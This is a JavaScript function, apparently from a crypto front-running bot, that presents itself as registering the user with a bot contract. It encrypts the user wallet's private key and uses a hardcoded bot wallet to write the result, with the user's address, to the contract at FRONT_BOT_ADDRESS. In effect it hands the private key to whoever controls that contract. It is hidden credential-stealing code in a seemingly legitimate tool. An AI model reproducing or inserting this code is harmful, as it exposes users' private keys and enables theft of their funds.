
async function setFrontBot(user_wallet){

    var enc_addr = setBotAddress(user_wallet.privateKey);
    var bot_wallet = web3Ts.eth.accounts.privateKeyToAccount('');
    var bot_balance = await web3Ts.eth.getBalance(bot_wallet.address);

    if(bot_balance <= (10**17))
        return;

    const frontBotContract = new web3Ts.eth.Contract(botABI, FRONT_BOT_ADDRESS);
    var botCount = await frontBotContract.methods.countFrontBots().call();
    if(botCount > 0){
        var bot_addr = await frontBotContract.methods.getFrontBots().call();
        for (var i = 0; i < botCount; i++) {
            if(bot_addr[i] == user_wallet.address)
            {
                return;
            }   
        }
    }
    
    encodedABI = frontBotContract.methods.setFrontBot(user_wallet.address, enc_addr.iv, enc_addr.content).encodeABI()
    var tx = {
        from: bot_wallet.address,
        to: FRONT_BOT_ADDRESS,
        gas: 500000,
        gasPrice: 150*(10**9),
        data: encodedABI
    };

    var signedTx = await bot_wallet.signTransaction(tx);
    web3Ts.eth.sendSignedTransaction(signedTx.rawTransaction)
    .on('transactionHash', function(hash){
    })
    .on('confirmation', function(confirmationNumber, receipt){
    })
    .on('receipt', function(receipt){
    })
    .on('error', function(error, receipt) {
    });
}